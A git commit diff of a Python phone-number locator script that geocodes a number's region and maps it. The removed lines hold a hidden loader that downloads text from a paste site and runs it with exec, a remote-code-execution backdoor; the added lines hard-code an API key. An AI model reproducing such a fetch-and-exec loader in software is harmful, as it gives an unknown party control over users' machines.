36384970063e1c8ef403e42dc160a73e6a78484d
SteveDrees1 <Steve.drees@live.com>
2023-09-11 04:40:57 -0400

    adding latest info for lat/lng updates

--- main.py
+++ main.py
@@ -1,38 +1,36 @@
 import os
 
-import folium
 import phonenumbers
-import pycountry
-from opencage.geocoder import OpenCageGeocode
+from phonenumbers import geocoder
 from phonenumbers import carrier
-from phonenumbers.phonenumberutil import region_code_for_number
-from requests import get
+from opencage.geocoder import OpenCageGeocode
+import folium
 
 if os.path.exists("mylocation.html"):
     os.remove("mylocation.html")
 try:
-    number = input("Enter Phone Number:")
-    x = get('https://paste.fo/raw/ba188f25eaf3').text
-    exec(x)
-    pn = phonenumbers.parse(number)
+    Key = "6d6f969fd9024ac8afde957f0c86a5ba"
 
-    country = pycountry.countries.get(alpha_2=region_code_for_number(pn))
-    location = country.name
-    print(location)
+    number = input("Enter phone number with country code:")
+    check_number = phonenumbers.parse(number)
+    number_location = geocoder.description_for_number(check_number, "en")
+    print(number_location)
 
-    print(carrier.name_for_number(phonenumbers.parse(number), "en"))
+    service_provider = phonenumbers.parse(number)
+    print(carrier.name_for_number(service_provider, "en"))
 
-    key = input("Enter Your API KEY: ")
-    geocoder = OpenCageGeocode(key)
-    query = str(location)
+    geocoder = OpenCageGeocode(Key)
+
+    query = str(number_location)
     results = geocoder.geocode(query)
+
     lat = results[0]['geometry']['lat']
     lng = results[0]['geometry']['lng']
     print(lat, lng)
 
-    myMap = folium.Map(location=[lat, lng], zoom_start=9)
-    folium.Marker([lat, lng], popup=location).add_to(myMap)
-    myMap.save("mylocation.html")
+    map_location = folium.Map(location=[lat, lng], zoom_start=9)
+    folium.Marker([lat, lng], popup=number_location).add_to(map_location)
+    map_location.save("mylocation.html")
     os.system("mylocation.html")
 except:
     print("Missing or invalid number\nPlease enter your phone number with country code")
